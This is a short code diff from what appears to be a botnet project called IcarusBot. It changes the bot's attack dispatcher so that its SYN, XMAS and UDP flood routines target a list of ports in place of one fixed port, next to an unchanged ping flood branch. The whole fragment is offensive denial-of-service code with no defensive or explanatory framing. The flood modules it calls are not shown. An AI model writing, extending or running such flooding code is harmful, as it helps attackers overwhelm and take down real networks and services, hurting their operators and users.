@@ -147,13 +147,13 @@ class IcarusBot:
                         #attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, NUM_PACKETS_TO_SEND, [1]))
                         #attack_thread.start()
                         #attack_thread.join()
-                        syn_flood.SYN_Flood(target_ip, NUM_PACKETS_TO_SEND, [1])
+                        syn_flood.SYN_Flood(target_ip, NUM_PACKETS_TO_SEND, ports)
                     elif attack_type == 'XMAS_FLOOD':
-                        xmas_attack.XMAS_Attack(target_ip, NUM_PACKETS_TO_SEND, [1])
+                        xmas_attack.XMAS_Attack(target_ip, NUM_PACKETS_TO_SEND, ports)
                     elif attack_type == 'PING_FLOOD':
                         ping_flood.PING_Flood(target_ip, NUM_PACKETS_TO_SEND)
                     elif attack_type == 'UDP_FLOOD':
-                        udp_flood.UDP_Flood(target_ip, NUM_PACKETS_TO_SEND, [1])
+                        udp_flood.UDP_Flood(target_ip, NUM_PACKETS_TO_SEND, ports)
                     else:
                         print("No attack type specified")
 
